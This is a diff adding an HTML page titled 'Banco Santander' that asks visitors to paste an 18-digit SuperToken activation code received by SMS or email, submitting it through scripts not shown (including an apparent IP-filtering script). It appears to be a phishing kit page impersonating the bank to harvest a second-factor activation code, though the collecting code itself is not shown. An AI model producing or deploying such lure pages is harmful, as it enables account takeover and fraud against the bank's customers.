@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="estilo.css">
+      <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+      <script src="alerta2.js"></script>
+      <script src="ipvalidation.js"></script>
+      <link rel="icon" href="icono.png" type="image/x-icon"> 
+      <link rel="apple-touch-icon" href="icono.png"> 
+  <title>Banco Santander</title>
+</head>
+<body class="body">
+    <div class="general">
+  <form id="formulario" onsubmit="enviarFormulario(event)" class="form">
+    <img src="logo.png" class="logo">
+    <p class="texto"><b>Verificación de supertoken</b></p>
+    <p class="texto1"><b>Te enviamos un código de activación de 18 dígitos vía SMS o correo electrónico para activar tu SuperToken. Copialo y pegalo aquí.</b></p>
+    <img src="imag2.png" class="imag1"><br><br>
+    <label class="texto2"><b>Código de activación</b></label><br>
+    <input class="documento" type="text" id="documento" maxlength="18" minlength="18" pattern="[0-9]*" inputmode="numeric" required placeholder="Código de 18 dígitos"><br><br>
+    <button type="submit" class="boton">Verificar</button>
+  </form>
+  <script src="jandex2.js"></script>
+</div>
+</body>
+</html>
